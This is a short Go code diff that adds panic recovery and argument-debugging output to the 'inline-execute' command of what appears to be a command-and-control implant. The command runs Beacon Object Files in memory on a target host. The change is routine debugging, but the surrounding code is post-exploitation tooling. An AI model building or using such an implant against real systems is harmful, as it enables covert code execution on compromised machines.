@@ -37,12 +37,20 @@ type InlineExecuteParams struct {
 
 // Execute executes the inline-execute command
 func (c *InlineExecuteCommand) Execute(task structs.Task) structs.CommandResult {
+	// Add panic recovery to catch crashes
+	defer func() {
+		if r := recover(); r != nil {
+			// Panic occurred - log it
+			fmt.Printf("PANIC RECOVERED in inline-execute: %v\n", r)
+		}
+	}()
+
 	// Parse parameters
 	var params InlineExecuteParams
 	err := json.Unmarshal([]byte(task.Params), &params)
 	if err != nil {
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
+			Output:    fmt.Sprintf("Error parsing parameters: %v\nRaw params: %s", err, task.Params),
 			Status:    "error",
 			Completed: true,
 		}
@@ -75,12 +83,16 @@ func (c *InlineExecuteCommand) Execute(task structs.Task) structs.CommandResult 
 		}
 	}
 
-	// Build output string
+	// Debug: Show what we received
 	var output strings.Builder
 	output.WriteString(fmt.Sprintf("[*] BOF size: %d bytes\n", len(bofBytes)))
 	output.WriteString(fmt.Sprintf("[*] Entry point: %s\n", params.EntryPoint))
-	output.WriteString(fmt.Sprintf("[*] Arguments: %v\n", params.Arguments))
-	output.WriteString(fmt.Sprintf("[*] About to pack and execute BOF...\n"))
+	output.WriteString(fmt.Sprintf("[*] Arguments RAW: %v\n", params.Arguments))
+	output.WriteString(fmt.Sprintf("[*] Arguments count: %d\n", len(params.Arguments)))
+	for i, arg := range params.Arguments {
+		output.WriteString(fmt.Sprintf("[*]   Arg[%d]: %q (len=%d)\n", i, arg, len(arg)))
+	}
+	output.WriteString("[*] About to pack arguments...\n")
 
 	// Try to pack arguments first to see if that's where it crashes
 	packedArgs, err := lighthouse.PackArgs(params.Arguments)
